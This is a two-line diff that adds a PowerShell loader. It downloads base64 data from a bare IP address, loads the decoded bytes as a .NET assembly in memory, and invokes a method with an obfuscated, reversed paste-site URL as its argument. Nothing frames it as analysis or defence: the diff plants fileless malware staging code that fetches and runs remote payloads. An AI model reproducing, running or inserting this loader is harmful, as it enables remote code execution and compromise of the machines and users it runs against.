@@ -1,0 +1,2 @@
+[Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://5.42.199.235/dll/dlljs.txt'));
+[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('EPVp3SbdD8xx/daolnwod/moc.oietsap//:sptth'))
